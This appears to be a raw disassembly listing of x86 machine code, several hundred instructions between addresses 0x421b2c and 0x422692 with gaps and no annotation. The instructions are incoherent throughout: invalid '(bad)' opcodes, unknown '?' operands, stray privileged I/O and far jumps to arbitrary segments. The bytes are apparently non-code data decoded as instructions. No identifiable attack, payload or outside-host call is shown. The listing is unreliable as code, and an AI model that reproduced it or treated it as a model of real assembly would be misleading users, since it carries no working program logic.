  421b2c:	mov    esp,0xf9186f96
  421b31:	pop    ds
  421b32:	outs   dx,BYTE PTR ds:[esi]
  421b33:	lods   eax,DWORD PTR ds:[esi]
  421b34:	add    ebp,DWORD PTR [ebp+0x7886754f]
  421b3a:	rcr    esp,1
  421b3c:	push   esp
  421b3d:	adc    DWORD PTR [edi+esi*8],0xcf
	...
  421bb4:	mov    dl,BYTE PTR ds:0xbf9fb10b
  421bba:	mov    edx,0xae2d6a3f
  421bbf:	sub    esp,DWORD PTR [edx]
  421bc1:	sbb    ch,bl
  421bc3:	loopne 0x421b6e
  421bc5:	push   0xf50001
  421bca:	add    BYTE PTR [eax],al
  421bcc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421bcd:	mov    dh,0xbc
  421bcf:	adc    edi,ebp
  421bd1:	push   ebp
  421bd2:	iret   
  421bd3:	push   cs
  421bd4:	or     eax,0x43a910d
  421bd9:	and    eax,0xb178c961
  421bde:	mov    eax,ebp
  421be0:	jmp    FWORD PTR [eax-0x17121842]
  421be6:	mov    ebx,0x91d63f89
  421beb:	mov    cx,?
  421bee:	pop    edi
  421bef:	in     eax,dx
  421bf0:	push   ecx
  421bf1:	pop    ebp
  421bf2:	sbb    bl,BYTE PTR [ecx-0x51]
  421bf5:	jp     0x421c4e
  421bf7:	jnp    0x421c55
  421bf9:	ror    DWORD PTR [ecx-0x61],1
  421bfc:	add    edx,ebp
  421bfe:	addr16 inc edi
  421c00:	sbb    DWORD PTR [edi],0xc208235e
  421c06:	xchg   ecx,eax
  421c07:	enter  0x89f7,0x97
  421c0b:	mov    WORD PTR [edx-0x3f1f80b9],?
  421c11:	push   es
  421c12:	lock (bad) [eax-0x48edc7ac]
  421c19:	mov    ?,WORD PTR [ebx]
  421c1b:	mov    cs,WORD PTR [edx+0x66]
  421c1e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421c1f:	arpl   WORD PTR [edx-0x2f283a7c],sp
  421c25:	icebp  
  421c26:	push   ebx
  421c27:	dec    ebp
  421c28:	add    BYTE PTR [ecx+0x5a],dh
  421c2b:	xor    esp,esi
  421c2d:	or     eax,0x97b9162b
  421c32:	loop   0x421c47
  421c34:	dec    esp
  421c35:	sub    DWORD PTR [edi],esp
  421c37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421c38:	cmp    edi,eax
  421c3a:	add    edi,DWORD PTR [esp+eax*8+0x58]
  421c3e:	push   esp
  421c40:	mov    eax,ds:0x80ec8ec7
  421c45:	jo     0x421c2c
  421c47:	pop    esp
  421c48:	retf   0x5963
  421c4b:	inc    esp
  421c4c:	enter  0x6930,0xf7
  421c50:	xor    dl,BYTE PTR [edx-0x71]
  421c53:	mov    DWORD PTR [esp+ecx*2+0x1dc9197a],ecx
  421c5a:	jne    0x421c7b
  421c5c:	lahf   
  421c5d:	push   ebp
  421c5e:	test   al,0x51
  421c60:	std    
  421c61:	es jge 0x421ca3
  421c64:	lods   al,BYTE PTR ds:[esi]
  421c65:	jns    0x421bfd
  421c67:	adc    eax,0x352af1b
  421c6c:	int    0x1f
  421c6e:	cwde   
  421c6f:	sub    ah,al
  421c71:	add    DWORD PTR [ecx],0x30
  421c74:	mov    ecx,DWORD PTR [eax]
  421c76:	inc    esi
  421c78:	jno    0x421c89
  421c7a:	sbb    ecx,esi
  421c7c:	pop    es
  421c7d:	mov    ch,0x19
  421c7f:	imul   esi,DWORD PTR [eax-0x56],0xffffffd3
  421c83:	rcr    DWORD PTR [esp+ecx*4],cl
  421c86:	lods   eax,DWORD PTR ds:[esi]
  421c87:	adc    al,0x0
  421c89:	mov    esi,0xd49d359
  421c8e:	adc    BYTE PTR [ebp+0x33],0x8c
  421c92:	push   ecx
  421c93:	arpl   di,si
  421c95:	inc    edi
  421c96:	mov    dl,0x2f
  421c98:	jno    0x421cf9
  421c9a:	jo     0x421c1d
  421c9c:	pop    ebx
  421c9d:	jg     0x421cf5
  421c9f:	push   0x5
  421ca1:	sbb    DWORD PTR [ebx-0x21d61a8],edx
  421ca7:	mov    esi,0x6749d8d7
  421cac:	test   esp,0xab7cd3b
  421cb2:	mov    al,ds:0x1648d8e4
  421cb7:	scas   eax,DWORD PTR es:[edi]
  421cb8:	shr    DWORD PTR [edx],1
  421cba:	fld    TBYTE PTR [edx]
  421cbc:	inc    edi
  421cbd:	data16 loopne 0x421d27
  421cc0:	add    al,BYTE PTR [eax]
	...
  421d32:	add    BYTE PTR [eax],al
  421d34:	out    0x1e,eax
  421d36:	into   
  421d37:	push   0x9fe7f8ff
  421d3c:	cmp    al,0xf2
  421d3e:	sub    al,0x59
  421d40:	retf   0x7a07
  421d43:	aas    
  421d44:	sahf   
  421d45:	imul   eax,DWORD PTR [ecx],0xf500
  421d4b:	add    BYTE PTR [esi],bl
  421d4d:	jb     0x421cf5
  421d4f:	mov    BYTE PTR [edx],dh
  421d51:	dec    ecx
  421d52:	mov    ebx,0xd44b7e22
  421d57:	pusha  
  421d58:	in     eax,0xc4
  421d5a:	out    0x9a,eax
  421d5c:	mov    WORD PTR [edx],gs
  421d5e:	(bad)  
  421d60:	cmp    dl,bh
  421d62:	or     al,0x23
  421d64:	rcr    DWORD PTR [ebx],1
  421d66:	rol    ebx,1
  421d68:	jle    0x421d1d
  421d6a:	add    ah,BYTE PTR [esi+0x19d3a3dc]
  421d70:	push   edx
  421d71:	or     DWORD PTR [edi+ebx*2-0x13],ebp
  421d75:	enter  0x8f29,0xbe
  421d79:	xor    eax,0xfa2416b4
  421d7e:	dec    ebp
  421d7f:	daa    
  421d80:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421d81:	mov    ds:0x40f698ae,al
  421d86:	ins    DWORD PTR es:[edi],dx
  421d87:	cmp    al,0x6e
  421d89:	vpsrlq ymm5,ymm6,XMMWORD PTR [ebx+0x6acd38fc]
  421d91:	xchg   ebp,eax
  421d92:	mov    ds:0x4d54fea5,eax
  421d97:	xchg   edx,eax
  421d98:	mov    ebp,0xe9c1a7d5
  421d9d:	sub    al,0xa1
  421d9f:	lods   eax,DWORD PTR ds:[esi]
  421da0:	out    0xcf,al
  421da2:	fst    DWORD PTR [esi]
  421da4:	loope  0x421d62
  421da6:	retf   
  421da7:	push   0x18bdb182
  421dac:	(bad)  
  421dad:	imul   BYTE PTR [esi+0x2]
  421db0:	cmp    DWORD PTR [ebx+0x58b62096],0x6eede67a
  421dba:	xor    BYTE PTR [esi+0x9],dh
  421dbd:	addr16 inc ecx
  421dbf:	pop    eax
  421dc0:	daa    
  421dc1:	stos   DWORD PTR es:[edi],eax
  421dc2:	in     al,dx
  421dc3:	mov    cl,0x81
  421dc5:	jo     0x421e38
  421dc7:	xor    BYTE PTR [ebx],bh
  421dc9:	ja     0x421e06
  421dcb:	in     eax,dx
  421dcc:	(bad)  
  421dcd:	mov    esi,0xfc8bfe93
  421dd2:	out    0x58,eax
  421dd4:	mov    esi,0x1711bf25
  421dd9:	daa    
  421dda:	sbb    ah,dl
  421ddc:	sub    eax,0x1520edf
  421de1:	sahf   
  421de2:	push   es
  421de3:	das    
  421de4:	les    eax,FWORD PTR [eax+0x4e65f412]
  421dea:	popa   
  421deb:	stos   BYTE PTR es:[edi],al
  421dec:	sub    ecx,DWORD PTR [edi-0x449ef745]
  421df2:	dec    esi
  421df3:	pop    ds
  421df4:	mov    dl,0x96
  421df6:	jle    0x421ddb
  421df8:	daa    
  421df9:	dec    ecx
  421dfa:	retf   0x999b
  421dfd:	outs   dx,DWORD PTR ds:[esi]
  421dfe:	int    0x2a
  421e00:	xor    eax,0xeb6c37d3
  421e05:	mul    bl
  421e07:	ret    
  421e08:	fcmovbe st,st(4)
  421e0a:	mov    ecx,0xa296777a
  421e0f:	popf   
  421e10:	push   ebp
  421e11:	(bad)  
  421e12:	leave  
  421e13:	xor    DWORD PTR [eax],ecx
  421e15:	sub    al,0x72
  421e17:	pop    ecx
  421e18:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421e19:	stos   BYTE PTR es:[edi],al
  421e1a:	push   ss
  421e1b:	jnp    0x421e02
  421e1d:	and    al,0x60
  421e1f:	jl     0x421de0
  421e21:	ja     0x421dbb
  421e23:	cmp    al,0x4e
  421e25:	mov    ecx,eax
  421e27:	leave  
  421e28:	dec    ebp
  421e29:	retf   
  421e2a:	mov    ebp,0x5ea412fc
  421e2f:	outs   dx,DWORD PTR ds:[esi]
  421e30:	cdq    
  421e31:	jbe    0x421dd2
  421e33:	repnz mov ebx,0x79d3ac6c
  421e39:	(bad)  
  421e3a:	shl    BYTE PTR [eax-0x45],1
  421e3d:	sbb    esp,DWORD PTR [ebp+ebp*4+0x68]
	...
  421eb4:	and    BYTE PTR [edi-0x28082cbe],dl
  421eba:	mov    cl,0xf7
  421ebc:	fisttp WORD PTR [ebx-0x19]
  421ebf:	jo     0x421f05
  421ec1:	sbb    edi,DWORD PTR [ebx]
  421ec3:	outs   dx,BYTE PTR ds:[esi]
  421ec4:	xchg   ebx,eax
  421ec5:	push   0x1
  421ec7:	add    ch,dh
  421ec9:	add    BYTE PTR [eax],al
  421ecb:	add    BYTE PTR [edi-0x307105c3],dl
  421ed1:	mov    al,ds:0xe8500012
  421ed6:	jno    0x421f47
  421ed8:	out    dx,al
  421ed9:	sub    BYTE PTR [eax],ch
  421edb:	pop    ds
  421edc:	shl    BYTE PTR [ebp+0x2916ebcb],cl
  421ee2:	and    dh,BYTE PTR [edi+edi*4+0x35]
  421ee6:	push   es
  421ee7:	lea    ebx,[eax+0x72]
  421eea:	aam    0x98
  421eec:	retf   
  421eed:	ret    
  421eee:	sbb    DWORD PTR [edx-0x4537d4cb],eax
  421ef4:	mov    edx,0x500f01fe
  421ef9:	retf   
  421efa:	sub    BYTE PTR [ebx-0x2],dh
  421efd:	stos   DWORD PTR es:[edi],eax
  421efe:	in     al,dx
  421eff:	add    al,0xe9
  421f01:	loop   0x421f39
  421f03:	retf   0x8c93
  421f06:	sub    al,0x3
  421f08:	dec    eax
  421f09:	out    dx,eax
  421f0a:	mov    ds:0x72fd9658,eax
  421f0f:	lods   al,BYTE PTR ds:[esi]
  421f10:	add    dl,BYTE PTR [edx+esi*4+0x1c1c94a5]
  421f17:	pop    ds
  421f18:	xchg   ebx,eax
  421f19:	xor    eax,0x9301593f
  421f1e:	jmp    0x13b:0xd7cd103f
  421f25:	fwait
  421f26:	jae    0x421f1c
  421f28:	cwde   
  421f29:	call   0x1696fd18
  421f2e:	and    DWORD PTR [ebx],edx
  421f30:	push   edx
  421f31:	inc    esp
  421f32:	or     al,0x9b
  421f34:	jl     0x421efd
  421f36:	mov    dl,0x28
  421f38:	(bad)  
  421f39:	jmp    0xc7d5:0x8b9af830
  421f40:	push   cs
  421f41:	outs   dx,BYTE PTR ds:[esi]
  421f42:	inc    eax
  421f43:	ds rol ebx,0x81
  421f47:	sub    DWORD PTR [eax+0x73f3d6d],ecx
  421f4d:	fld    TBYTE PTR [ecx]
  421f4f:	lea    esi,[ebp-0x1e1019a5]
  421f55:	mov    ch,0x92
  421f57:	inc    ebx
  421f58:	xchg   BYTE PTR [esi-0x20],bh
  421f5b:	fcomp  QWORD PTR [eax+0x19]
  421f5e:	pop    esp
  421f5f:	stos   BYTE PTR es:[edi],al
  421f60:	jmp    0x4381:0xb2c9c67e
  421f67:	sub    BYTE PTR [ebx],ah
  421f69:	pop    esi
  421f6a:	test   BYTE PTR [ecx+0x40],dl
  421f6d:	xchg   edi,eax
  421f6e:	cmp    BYTE PTR [edx-0x58],al
  421f71:	iret   
  421f72:	xor    eax,0x5dae753d
  421f77:	mov    edi,0xad915387
  421f7c:	push   0x22
  421f7e:	dec    eax
  421f7f:	xchg   ebx,eax
  421f80:	pop    esp
  421f81:	icebp  
  421f82:	mov    al,0x4e
  421f84:	add    eax,0x45c42a46
  421f89:	and    bh,BYTE PTR [eax-0x18820373]
  421f8f:	std    
  421f90:	dec    ebp
  421f91:	adc    edx,DWORD PTR [edi-0x5e]
  421f94:	xchg   ecx,eax
  421f95:	dec    ecx
  421f96:	in     eax,dx
  421f97:	fidiv  DWORD PTR [edx+0x7341ceb4]
  421f9d:	fsubr  QWORD PTR [ecx+0x2664e25a]
  421fa3:	jmp    0x421fe8
  421fa5:	sub    BYTE PTR [eax+eax*4-0x28],0xfe
  421faa:	xchg   esi,eax
  421fab:	cmp    DWORD PTR [edx+ebp*4+0x606a5d9b],0x98f7c522
  421fb6:	cmp    al,0xc4
  421fb8:	xchg   edx,eax
  421fb9:	mov    edx,0x18cb3ff
  421fbe:	test   al,0xaf
  421fc0:	sbb    al,BYTE PTR [eax]
	...
  422032:	add    BYTE PTR [eax],al
  422034:	lahf   
  422035:	pop    esi
  422036:	fcmovb st,st(6)
  422038:	fcmovnb st,st(6)
  42203a:	lahf   
  42203b:	pop    edi
  42203c:	bnd ja 0x422029
  42203f:	mov    edi,0x1c24d54a
  422044:	mov    BYTE PTR [ebx+0x1],ch
  422047:	add    ch,dh
  422049:	add    BYTE PTR [eax],al
  42204b:	add    BYTE PTR [ebx],dl
  42204d:	sti    
  42204e:	fwait
  42204f:	adc    eax,DWORD PTR [eax+eiz*4]
  422052:	mov    esp,0xb822de02
  422057:	inc    ebx
  422058:	mov    edi,0x6d012949
  42205d:	jo     0x4220dd
  42205f:	lods   al,BYTE PTR ds:[esi]
  422060:	les    ebp,FWORD PTR [ebx]
  422062:	outs   dx,DWORD PTR ds:[esi]
  422063:	test   al,0x53
  422065:	mov    ah,0x67
  422067:	sub    edx,esi
  422069:	(bad)  
  42206a:	fimul  DWORD PTR [ecx+0x6f]
  42206d:	rcl    BYTE PTR [esp+edx*2],cl
  422070:	xor    eax,0xfad03651
  422075:	call   0x3589a736
  42207a:	fnstcw WORD PTR [ecx-0x2b]
  42207d:	mov    bh,0x1e
  42207f:	sub    DWORD PTR [esp+ebx*4+0x31e841a],esi
  422086:	jmp    0x4220d9
  422088:	xor    al,0x38
  42208a:	(bad)  
  42208b:	icebp  
  42208c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42208d:	pop    es
  42208e:	mov    edi,esi
  422090:	dec    edi
  422091:	sar    DWORD PTR ds:0xe963b5d1,cl
  422097:	inc    eax
  422098:	stos   BYTE PTR es:[edi],al
  422099:	sbb    edi,DWORD PTR [edi+0x3ef347d8]
  42209f:	mov    al,0xc6
  4220a1:	ja     0x4220ec
  4220a3:	ds push cs
  4220a5:	xchg   esp,eax
  4220a6:	dec    ebp
  4220a7:	push   esp
  4220a8:	lods   al,BYTE PTR ds:[esi]
  4220a9:	addr16 or al,0xc2
  4220ac:	lea    edi,[bx+0x70]
  4220b0:	pop    ecx
  4220b1:	out    dx,al
  4220b2:	pop    eax
  4220b3:	retf   0x5275
  4220b6:	jge    0x4220b4
  4220b8:	mov    ebp,0x76605921
  4220bd:	inc    edi
  4220be:	or     eax,edi
  4220c0:	and    ch,BYTE PTR [ebx-0x4e0a0b73]
  4220c6:	jne    0x422079
  4220c8:	add    eax,0xe279bc1b
  4220cd:	jae    0x422066
  4220cf:	aaa    
  4220d0:	adc    BYTE PTR [esi-0x215c209f],bh
  4220d6:	call   0x917:0x3ace4145
  4220dd:	aam    0xbe
  4220df:	xor    eax,0x6f29e7fb
  4220e4:	aam    0xe7
  4220e6:	sub    DWORD PTR [edx],0x54
  4220e9:	hlt    
  4220ea:	add    esi,ebp
  4220ec:	mov    ebx,DWORD PTR ds:0x1278128e
  4220f2:	or     BYTE PTR [ecx],al
  4220f4:	xchg   DWORD PTR [edi-0x1a],ebx
  4220f7:	mov    DWORD PTR [ebp+0x2b3f2aed],edx
  4220fd:	mov    ebp,0xf9f4ac9f
  422102:	sub    BYTE PTR [edi+ebp*2-0x7],dh
  422106:	call   0xd6c0:0xee7cafce
  42210d:	mul    bh
  42210f:	dec    ecx
  422110:	push   ecx
  422111:	imul   esp,esi,0xabc75295
  422117:	ret    0x8199
  42211a:	inc    esp
  42211b:	push   esi
  42211c:	lock dec esi
  42211e:	mov    eax,ds:0x869c2d52
  422123:	hlt    
  422124:	pop    eax
  422125:	inc    edx
  422126:	mov    ?,eax
  422128:	add    edx,DWORD PTR [edi+0x2f]
  42212b:	rcl    BYTE PTR [eax],cl
  42212d:	push   ds
  42212e:	push   ebp
  42212f:	xor    al,0x85
  422131:	mov    eax,0x8ff3a480
  422136:	pop    esi
  422137:	shl    BYTE PTR [eax+edx*1],1
  42213a:	sub    ebx,esp
  42213c:	sub    ch,BYTE PTR [eax]
  42213e:	xchg   DWORD PTR [ebp+0xd3],ecx
	...
  4221b4:	sahf   
  4221b5:	pop    ds
  4221b6:	(bad)  
  4221b7:	test   DWORD PTR [edi+0x3b7ffef7],0x38d52766
  4221c1:	add    edx,DWORD PTR [ebx+0x16c7d78]
  4221c7:	add    ch,dh
  4221c9:	add    BYTE PTR [eax],al
  4221cb:	add    BYTE PTR [edi],bh
  4221cd:	mov    cl,0xe4
  4221cf:	cs in  al,dx
  4221d1:	xchg   ecx,eax
  4221d2:	sub    eax,0x1bd53167
  4221d7:	out    0x7c,al
  4221d9:	pop    esp
  4221da:	dec    esi
  4221db:	jne    0x42220a
  4221dd:	jb     0x938c1d3c
  4221e3:	scas   al,BYTE PTR es:[edi]
  4221e4:	push   edi
  4221e5:	pop    ebp
  4221e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4221e7:	inc    esp
  4221e8:	mov    bh,0x8d
  4221ea:	mov    ch,0xa0
  4221ec:	xchg   edx,eax
  4221ed:	enter  0xb432,0xbd
  4221f1:	out    dx,eax
  4221f2:	add    edi,ecx
  4221f4:	pop    eax
  4221f5:	push   eax
  4221f6:	add    eax,0xcb0dabff
  4221fb:	mov    edx,0x56a3f26f
  422200:	mov    edx,DWORD PTR [ebp+0x696912e0]
  422206:	xor    al,0x17
  422208:	jae    0x42222d
  42220a:	mov    al,0x33
  42220c:	(bad)  
  42220d:	mov    esi,0x8250868f
  422212:	enter  0x147c,0x1
  422216:	fld    QWORD PTR [esi-0x6]
  422219:	cmp    BYTE PTR [ebp-0x41],cl
  42221c:	adc    eax,0x961b3a33
  422221:	pop    ds
  422222:	adc    DWORD PTR [ebx+eiz*4+0x7c],ebx
  422226:	sub    BYTE PTR [edx+0x537c3e0c],ah
  42222c:	mov    ?,WORD PTR [bp+0x41]
  422230:	inc    eax
  422231:	xor    eax,0x11bf5a3e
  422236:	(bad)  
  422237:	fwait
  422238:	call   0x9ed:0x8ddfa21f
  42223f:	cld    
  422240:	cmp    DWORD PTR [ebx],edi
  422242:	mov    ebx,0xb56beff
  422247:	xchg   ebx,eax
  422248:	loope  0x422219
  42224a:	retf   0xaa29
  42224d:	sub    ecx,DWORD PTR [esp+eax*2+0x3b]
  422251:	pop    edx
  422252:	jge    0x42220b
  422254:	inc    ecx
  422255:	sbb    eax,0x5e26c5d8
  42225a:	sub    edi,DWORD PTR [edi]
  42225c:	pop    ecx
  42225d:	hlt    
  42225e:	add    eax,DWORD PTR [ebp-0x6b84234e]
  422264:	out    dx,eax
  422265:	inc    ebp
  422266:	aas    
  422267:	inc    edi
  422268:	cmc    
  422269:	test   eax,0x1c8cf894
  42226e:	sub    dl,ah
  422270:	cmp    DWORD PTR [esi],eax
  422272:	jb     0x42223e
  422274:	fs xchg ecx,eax
  422276:	mov    bh,0x4f
  422278:	popf   
  422279:	outs   dx,BYTE PTR ds:[esi]
  42227a:	push   esp
  42227b:	ret    
  42227c:	sub    al,BYTE PTR [edx]
  42227e:	pop    esp
  42227f:	xchg   edx,eax
  422280:	xor    BYTE PTR [edi],dl
  422282:	nop
  422283:	sub    eax,0x3ad37ae5
  422288:	imul   ebx,DWORD PTR [ebp+0x7bb1aa3b],0xffffffb7
  42228f:	or     DWORD PTR [edi+0xb],0x2d
  422293:	push   esi
  422294:	and    eax,0xf213ef28
  422299:	dec    ebp
  42229a:	test   eax,0x676f0e36
  42229f:	jbe    0x4222d1
  4222a1:	sbb    ah,BYTE PTR [edi-0x619b9669]
  4222a7:	sbb    eax,0x7be004f4
  4222ac:	repnz rcr BYTE PTR [edi+0x44],1
  4222b0:	add    esp,ecx
  4222b2:	nop
  4222b3:	fsubr  st(3),st
  4222b5:	nop
  4222b6:	iret   
  4222b7:	jno    0x422300
  4222b9:	mov    esi,0xa69ede02
  4222be:	outs   dx,DWORD PTR es:[esi]
  4222c0:	in     al,dx
	...
  422331:	add    BYTE PTR [eax],al
  422333:	add    dh,bh
  422335:	(bad)  
  422336:	pop    esp
  422337:	mov    eax,ds:0xdfffbb7d
  42233c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42233d:	inc    edi
  42233e:	gs pop es
  422340:	pushf  
  422341:	or     BYTE PTR [ebx],dh
  422343:	shl    BYTE PTR [edx+0x6d],cl
  422346:	add    DWORD PTR [eax],eax
  422348:	cmc    
  422349:	add    BYTE PTR [eax],al
  42234b:	add    BYTE PTR [eax],ch
  42234d:	rcr    esp,1
  42234f:	pop    ebx
  422350:	es jecxz 0x422314
  422353:	jg     0x422359
  422355:	inc    eax
  422356:	mov    DWORD PTR [edi-0x44926c12],0x52172836
  422360:	sbb    DWORD PTR [edx-0x6bac968d],eax
  422366:	mov    fs,edi
  422368:	jnp    0x42235d
  42236a:	add    al,0x1d
  42236c:	push   0xd7641ffb
  422371:	pushf  
  422372:	push   es
  422373:	loopne 0x4223ec
  422375:	in     eax,0xa2
  422377:	lock out 0xee,eax
  42237a:	pop    ds
  42237b:	lds    ecx,FWORD PTR [eax+eax*4-0x48a5cb7d]
  422382:	xor    ebp,DWORD PTR gs:[edx-0x3f]
  422386:	jne    0x4223aa
  422388:	test   eax,0x81c11dd0
  42238d:	fs das 
  42238f:	jno    0x4223c4
  422391:	sub    al,0xa2
  422393:	xor    al,0x99
  422395:	lock inc esi
  422397:	cmp    edx,DWORD PTR [ecx]
  422399:	loope  0x4223c6
  42239b:	adc    eax,DWORD PTR [eax+0x48df56e4]
  4223a1:	or     edi,ebp
  4223a3:	(bad)  
  4223a5:	xlat   BYTE PTR ds:[ebx]
  4223a6:	mov    ds:0xc6565b4,al
  4223ab:	cdq    
  4223ac:	inc    edi
  4223ad:	pusha  
  4223ae:	push   es
  4223af:	mov    ebp,0x9a449938
  4223b4:	js     0x4223cc
  4223b6:	push   es
  4223b7:	pop    es
  4223b8:	es add ebx,ebp
  4223bb:	ins    DWORD PTR es:[edi],dx
  4223bc:	out    0xb7,eax
  4223be:	fistp  DWORD PTR [ebx]
  4223c0:	mov    esp,0x88658904
  4223c5:	and    ebx,ebp
  4223c7:	enter  0xc90e,0xef
  4223cb:	imul   esp,DWORD PTR [ebp-0x39],0xb84aeb5b
  4223d2:	lahf   
  4223d3:	xchg   ebx,eax
  4223d4:	fmul   st,st(4)
  4223d6:	push   ebx
  4223d7:	(bad)  
  4223d8:	mul    BYTE PTR [esi+0x37678f0d]
  4223de:	jae    0x422381
  4223e0:	adc    edi,DWORD PTR [edi]
  4223e2:	and    BYTE PTR [ecx-0x5a],0x16
  4223e6:	fmul   DWORD PTR [eax+0x24]
  4223e9:	dec    eax
  4223ea:	push   cs
  4223eb:	xor    bh,al
  4223ed:	pop    es
  4223ee:	pop    ds
  4223ef:	push   edi
  4223f0:	mov    ecx,0xac76f616
  4223f5:	inc    edi
  4223f6:	and    BYTE PTR [ebx],ch
  4223f8:	repz mov ecx,0x10a26cf
  4223fe:	xor    edi,0x484a6e73
  422404:	lahf   
  422405:	stc    
  422406:	mov    dl,0x84
  422408:	lock mov al,BYTE PTR [edi]
  42240b:	popf   
  42240c:	mov    eax,ebx
  42240e:	jle    0x422401
  422410:	test   eax,0xd46e7cd
  422415:	loopne 0x4223bc
  422417:	mov    dl,0x2c
  422419:	jle    0x4223ba
  42241b:	sbb    bl,BYTE PTR [edx]
  42241d:	ds inc ebx
  42241f:	int3   
  422420:	push   esi
  422421:	mov    edx,0xb2fa2598
  422426:	mov    ?,WORD PTR [esp+edx*1+0x3516f02f]
  42242d:	push   esi
  42242e:	int    0x77
  422430:	add    eax,0x68951e01
  422435:	pop    edx
  422436:	add    DWORD PTR [ebx+0x1a],0x3010ff89
  42243d:	enter  0x5faa,0x2c
	...
  4224b1:	add    BYTE PTR [eax],al
  4224b3:	add    dh,dl
  4224b5:	repnz test BYTE PTR [eax],bl
  4224b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224b9:	jle    0x422499
  4224bb:	(bad)  
  4224bc:	(bad)  
  4224bd:	mov    edx,0x8f169f7c
  4224c2:	js     0x4224bd
  4224c4:	outs   dx,BYTE PTR ds:[si]
  4224c6:	add    DWORD PTR [eax],eax
  4224c8:	cmc    
  4224c9:	add    BYTE PTR [eax],al
  4224cb:	add    BYTE PTR [esi],dh
  4224cd:	mov    al,ds:0x423e3907
  4224d2:	adc    ch,BYTE PTR [eax+eiz*1+0x40e4ae2b]
  4224d9:	stos   DWORD PTR es:[edi],eax
  4224da:	call   0xf089:0xebb3272a
  4224e1:	imul   esp,ebp,0xd8e3e6f9
  4224e7:	mov    BYTE PTR [ebx-0xc1adddc],0xf5
  4224ee:	xchg   esi,eax
  4224ef:	aam    0xfe
  4224f1:	je     0x422474
  4224f3:	sahf   
  4224f4:	push   esi
  4224f5:	ins    BYTE PTR es:[edi],dx
  4224f6:	pop    es
  4224f7:	add    eax,0xb36ee6b1
  4224fc:	leave  
  4224fd:	inc    ebx
  4224fe:	inc    eax
  4224ff:	and    DWORD PTR [edi],0xe0b29842
  422505:	mov    al,ds:0x2b3edb21
  42250a:	jg     0x422523
  42250c:	inc    esi
  42250d:	ja     0x42257a
  42250f:	popf   
  422510:	fdivp  st(5),st
  422512:	xchg   ebp,eax
  422513:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422514:	jg     0x422507
  422516:	clc    
  422517:	dec    ebp
  422518:	jno    0x4224f5
  42251a:	xor    eax,edi
  42251c:	rcr    BYTE PTR [ebx],1
  42251e:	dec    esi
  42251f:	das    
  422520:	inc    eax
  422521:	xor    eax,0x613c57c2
  422526:	mov    bl,BYTE PTR [eax+0x4b]
  422529:	(bad)
  42252e:	fimul  DWORD PTR [edx-0x21]
  422531:	add    DWORD PTR [edi+edi*2-0xc],edx
  422535:	pop    ecx
  422536:	(bad)  [esi-0x57aa2882]
  42253c:	test   DWORD PTR [ebx+0x2a],ebx
  42253f:	(bad)  
  422541:	sub    eax,0xe7a1f30d
  422546:	or     eax,esi
  422548:	push   esp
  422549:	sub    DWORD PTR [eax+ebp*1-0x67ef3754],ebp
  422550:	push   eax
  422551:	cmp    al,0x57
  422553:	cmp    edx,ecx
  422555:	nop
  422556:	gs pop edx
  422558:	mov    WORD PTR fs:[edi+0x68fce69c],ds
  42255f:	outs   dx,DWORD PTR ds:[esi]
  422560:	and    eax,0x4568ad62
  422565:	out    dx,eax
  422566:	push   0xffffffeb
  422568:	mov    edx,cs
  42256a:	shl    eax,0xcf
  42256d:	sub    BYTE PTR [ebp-0xb4e3766],al
  422573:	mov    ebx,0x3d582e8a
  422578:	adc    BYTE PTR [eax],dl
  42257a:	fldcw  WORD PTR [ebx+0x4]
  42257d:	pushf  
  42257e:	shl    dl,0x95
  422581:	rol    esi,0x60
  422584:	cwde   
  422585:	sbb    cl,0x0
  422588:	cmp    BYTE PTR [eax+0x2d3d198e],al
  42258e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42258f:	pminsw mm4,QWORD PTR [edx+0x558d1d9a]
  422596:	sbb    eax,0x9ed7171
  42259b:	xor    eax,0x30b97f83
  4225a0:	jmp    0x4225e2
  4225a2:	cld    
  4225a3:	das    
  4225a4:	stos   DWORD PTR es:[edi],eax
  4225a5:	xchg   ebp,eax
  4225a6:	dec    ebp
  4225a7:	fwait
  4225a8:	mov    ah,0x6
  4225aa:	jb     0x422546
  4225ac:	jmp    0x1490a8a4
  4225b1:	stos   DWORD PTR es:[edi],eax
  4225b2:	loopne 0x42257b
  4225b4:	or     al,0x54
  4225b6:	fwait
  4225b7:	aas    
  4225b8:	mov    edi,0x8f141118
  4225bd:	rcl    DWORD PTR [edi-0x2a],cl
  4225c0:	mov    bh,0x0
	...
  422632:	add    BYTE PTR [eax],al
  422634:	stos   DWORD PTR es:[edi],eax
  422635:	sub    al,0xed
  422637:	stos   BYTE PTR es:[edi],al
  422638:	out    dx,eax
  422639:	jmp    0x42262a
  42263b:	sub    eax,0xb720f321
  422640:	push   ds
  422641:	lds    ebp,FWORD PTR [ebp+0x4c]
  422644:	pop    esp
  422645:	outs   dx,DWORD PTR ds:[esi]
  422646:	add    DWORD PTR [eax],eax
  422648:	cmc    
  422649:	add    BYTE PTR [eax],al
  42264b:	add    BYTE PTR [eax-0x147b522],ah
  422651:	push   edi
  422652:	jg     0x4225df
  422654:	jns    0x422692
  422656:	clc    
  422657:	out    0x39,eax
  422659:	std    
  42265a:	mov    al,ds:0x6f1b3201
  42265f:	and    eax,0x38f6895f
  422664:	and    BYTE PTR [edx+edx*2+0x4e],0x9a
  422669:	mov    ecx,0xce243ce6
  42266e:	fstp   DWORD PTR [eax-0x33]
  422671:	ins    BYTE PTR es:[edi],dx
  422672:	cmp    BYTE PTR [ebx],al
  422674:	and    dh,BYTE PTR [ebx]
  422676:	xchg   esp,eax
  422677:	mov    ebx,0xb87efd77
  42267c:	ins    DWORD PTR es:[edi],dx
  42267d:	adc    BYTE PTR [ecx+0x78],dl
  422680:	dec    ebp
  422681:	scas   al,BYTE PTR es:[edi]
  422682:	loopne 0x422656
  422684:	icebp  
  422685:	or     BYTE PTR [ebp+esi*1-0x45],ch
  422689:	mov    esp,0x3aba51e
  42268e:	dec    ecx
  42268f:	rcl    ecx,0xf9
  422692:	jno    0x4226fa
